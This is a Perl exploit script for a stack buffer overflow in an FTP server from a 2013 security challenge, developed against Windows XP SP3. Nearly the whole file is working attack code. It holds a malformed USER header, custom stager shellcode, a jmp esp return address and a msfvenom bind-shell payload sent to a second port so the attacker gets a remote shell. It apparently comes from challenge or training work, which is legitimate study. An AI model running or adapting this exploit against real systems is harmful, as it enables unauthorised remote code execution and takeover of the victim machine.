#!/usr/bin/perl

# Inspired by OJ Reeves: https://buffered.io/posts/idsecconf-2013-myftpd-challenge/
# Developed against Windows XP Professional SP 3 English

use IO::Socket;

if($ARGV[0] eq ''){
die("Proper usage $0 IP_ADDRESS PORT_1 PORT_2\n\n");
}

$badheader = "USER /.:/";
$junk = "\x41" x 252;

# 351 bytes total buffer
# EIP offset = 280
# ESP offset = 288
# Earliest stack offset = 252

# $block2 contains the code to prepare for and execute recv

$block2 = "\x66\xBC\x54\xFD\xB6\x02\x54\x59\x66\xBC\x64\xFC\x66\xBB\xDC\x82\x52\x51\x50\x8B\xF9\xFF\x13\xFF\xE7";
$block2 .= "\xCC" x (28-length($block2));

$eip = "\xf7\x56\x44\x7e"; # jmp esp user32.dll

# $block3 is the space between EIP and ESP offsets when initially fuzzed

$block3 = "\x43" x 4;

# the beginning 4 bytes of $block1 are the initial ESP overwrite
# the rest of the code executes socket, bind, listen, and accept; then jumps to start of $block2

$block1 = "\x83\xEC\x7C\xBB\x11\x34\x34\x40\xC1\xEB\x08\xB0\x06\xB0\x01\x40\x50\xFF\xD3\x8B\xF8\x8B\xCB\xB5\x74".
"\xFE\x41\x03\xB3\x54\x6A\x10\x51\x57\xFF\xD3\xB3\x5C\x6A\x7F\x57\xFF\xD3\xB3\x24\x57\xFF\xD3\x8B\xF8\xEB\xA8";

$block1 .= "\x43" x (63-length($block1));

# msfvenom -p windows/shell_bind_tcp LPORT=80 -b "\x00\x0a\x0d" -f perl -v payload EXITFUNC=seh
# Payload size: 355 bytes

$payload = "\xdd\xc0\xd9\x74\x24\xf4\x5a\xbb\x0b\xe0\x43\x97\x31\xc9" .
"\xb1\x53\x31\x5a\x17\x83\xc2\x04\x03\x51\xf3\xa1\x62\x99" .
"\x1b\xa7\x8d\x61\xdc\xc8\x04\x84\xed\xc8\x73\xcd\x5e\xf9" .
"\xf0\x83\x52\x72\x54\x37\xe0\xf6\x71\x38\x41\xbc\xa7\x77" .
"\x52\xed\x94\x16\xd0\xec\xc8\xf8\xe9\x3e\x1d\xf9\x2e\x22" .
"\xec\xab\xe7\x28\x43\x5b\x83\x65\x58\xd0\xdf\x68\xd8\x05" .
"\x97\x8b\xc9\x98\xa3\xd5\xc9\x1b\x67\x6e\x40\x03\x64\x4b" .
"\x1a\xb8\x5e\x27\x9d\x68\xaf\xc8\x32\x55\x1f\x3b\x4a\x92" .
"\x98\xa4\x39\xea\xda\x59\x3a\x29\xa0\x85\xcf\xa9\x02\x4d" .
"\x77\x15\xb2\x82\xee\xde\xb8\x6f\x64\xb8\xdc\x6e\xa9\xb3" .
"\xd9\xfb\x4c\x13\x68\xbf\x6a\xb7\x30\x1b\x12\xee\x9c\xca" .
"\x2b\xf0\x7e\xb2\x89\x7b\x92\xa7\xa3\x26\xfb\x04\x8e\xd8" .
"\xfb\x02\x99\xab\xc9\x8d\x31\x23\x62\x45\x9c\xb4\x85\x7c" .
"\x58\x2a\x78\x7f\x99\x63\xbf\x2b\xc9\x1b\x16\x54\x82\xdb" .
"\x97\x81\x3f\xd3\x3e\x7a\x22\x1e\x80\x2a\xe2\xb0\x69\x21" .
"\xed\xef\x8a\x4a\x27\x98\x23\xb7\xc8\xa6\xe3\x3e\x2e\xcc" .
"\x13\x17\xf8\x78\xd6\x4c\x31\x1f\x29\xa7\x69\xb7\x62\xa1" .
"\xae\xb8\x72\xe7\x98\x2e\xf9\xe4\x1c\x4f\xfe\x20\x35\x18" .
"\x69\xbe\xd4\x6b\x0b\xbf\xfc\x1b\xa8\x52\x9b\xdb\xa7\x4e" .
"\x34\x8c\xe0\xa1\x4d\x58\x1d\x9b\xe7\x7e\xdc\x7d\xcf\x3a" .
"\x3b\xbe\xce\xc3\xce\xfa\xf4\xd3\x16\x02\xb1\x87\xc6\x55" .
"\x6f\x71\xa1\x0f\xc1\x2b\x7b\xe3\x8b\xbb\xfa\xcf\x0b\xbd" .
"\x02\x1a\xfa\x21\xb2\xf3\xbb\x5e\x7b\x94\x4b\x27\x61\x04" .
"\xb3\xf2\x21\x3a\x45\xce\xbf\xab\xfc\xbb\xfd\xb1\xfe\x16" .
"\xc1\xcf\x7c\x92\xba\x2b\x9c\xd7\xbf\x70\x1a\x04\xb2\xe9" .
"\xcf\x2a\x61\x09\xda";


$socket = IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[1]",
)or die("Could not connect to server");

$socket->recv($sd,1024);
print "[+] Connected to myftp server at $ARGV[0]:$ARGV[1]\n";
print "[+] Server response: ".$sd."\n";
print "[+] Sending exploit\n";
$socket->send($badheader.$junk.$block2.$eip.$block3.$block1);

$socket->recv($sd2,1024);
print "[+] Server response to exploit: " .$sd2."\n";
$socket->shutdown(SHUT_RDWR);

print "[+] First socket has shutdown\n";
print "[+] Sleeping for 2 seconds to allow for port to open on victim\n";
sleep(2);
print "[+] Sleep complete\n";
$socket2 = IO::Socket::INET->new(
Proto=>"tcp",
PeerAddr=>"$ARGV[0]",
PeerPort=>"$ARGV[2]"
)or die("Could not connect to server to send payload");
print "[+] Sending payload to port opened at $ARGV[0]:$ARGV[2]\n";
$socket2->send($payload);
print "[+] Payload sent\n";
